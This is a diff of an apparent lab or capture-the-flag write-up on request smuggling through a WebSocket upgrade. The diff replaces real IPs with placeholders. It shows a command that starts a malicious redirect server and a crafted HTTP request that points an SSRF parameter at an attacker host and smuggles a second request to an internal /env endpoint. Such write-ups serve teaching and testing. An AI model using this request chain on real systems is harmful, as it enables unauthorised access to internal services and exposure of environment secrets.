@@ -331,7 +331,7 @@ HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
 The server was started locally using:
 
 ```bash
-python3 server.py 9000
+python3 server.py <PORT_NO>
 ```
 
 The supplied argument specifies the listening port for the malicious server.
@@ -341,7 +341,7 @@ The objective was to abuse the backend's handling of WebSocket upgrade requests 
 A crafted request was sent through Burp Repeater:
 
 ```http
-GET /isOnline?url=http://10.10.101.122:9000 HTTP/1.1
+GET /isOnline?url=http://<ATTACKER_IP>:<PORT_NO> HTTP/1.1
 Host: 10.10.91.160:8080
 Set-WebSocket-Version: 777
 Upgrade: WebSocket
@@ -350,6 +350,8 @@ Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==late, br
 
 GET /env HTTP/1.1
 Host: 10.10.91.160:8080
+
+
 ```
 
 ### Important Notes
